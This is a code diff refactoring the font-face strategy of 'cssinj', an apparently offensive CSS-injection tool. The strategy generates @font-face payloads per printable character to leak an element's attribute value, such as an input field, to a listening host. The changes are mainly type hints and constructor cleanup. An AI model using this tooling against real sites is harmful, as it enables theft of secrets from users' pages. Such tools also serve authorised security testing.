@@ -1,7 +1,7 @@
 import asyncio
-import time
 import urllib.parse
 
+from cssinj.client import Client
 from cssinj.console import Console, LogLevel
 from cssinj.strategies.base import BaseExfiltrationStrategy
 from cssinj.utils import default
@@ -25,26 +25,22 @@ class FontFaceStrategy(BaseExfiltrationStrategy):
         attribut: str = 'value',
         timeout: float = 3.0,
     ) -> None:
-        super().__init__(hostname, port, timeout)
-        self.element = element
-        self.attribut = attribut
-        self._timeout_tasks: dict[int, asyncio.Task] = {}
+        super().__init__(hostname, port, element, attribut, timeout)
+        self._timeout_tasks: dict[int, asyncio.Task[None]] = {}
         self._ended: set[int] = set()
 
-    def generate_start_payload(self, client) -> str:
+    def generate_start_payload(self, client: Client) -> str:
         client.data = ''  # Reset data for this client
         self._ended.discard(client.id)
         return self._generate_font_face(client)
 
-    def generate_next_payload(self, client) -> str:
+    def generate_next_payload(self, client: Client) -> str:
         return self._generate_font_face(client)
 
-    def handle_valid(self, client, data: str) -> str:
+    def handle_valid(self, client: Client, data: str) -> str:
         # Accumulate characters (note: order is not guaranteed)
         if data not in client.data:
             client.data += data
-
-        client.last_seen = time.time()
 
         # Cancel existing timeout task
         existing = self._timeout_tasks.pop(client.id, None)
@@ -56,7 +52,7 @@ class FontFaceStrategy(BaseExfiltrationStrategy):
 
         return 'valid'
 
-    def handle_end(self, client) -> str:
+    def handle_end(self, client: Client) -> str:
         if client.id in self._ended:
             return 'end'
         self._ended.add(client.id)
@@ -79,7 +75,7 @@ class FontFaceStrategy(BaseExfiltrationStrategy):
         client.data = ''
         return 'end'
 
-    def _generate_font_face(self, client) -> str:
+    def _generate_font_face(self, client: Client) -> str:
         css = ''
         for char in default.PRINTABLE:
             encoded = urllib.parse.quote_plus(char)
@@ -94,7 +90,7 @@ class FontFaceStrategy(BaseExfiltrationStrategy):
         css += f'{self.element}{{font-family:exfil;}}'
         return css
 
-    async def _wait_for_timeout(self, client) -> None:
+    async def _wait_for_timeout(self, client: Client) -> None:
         """Wait for timeout then trigger end of exfiltration."""
         await asyncio.sleep(self.timeout)
         self.handle_end(client)
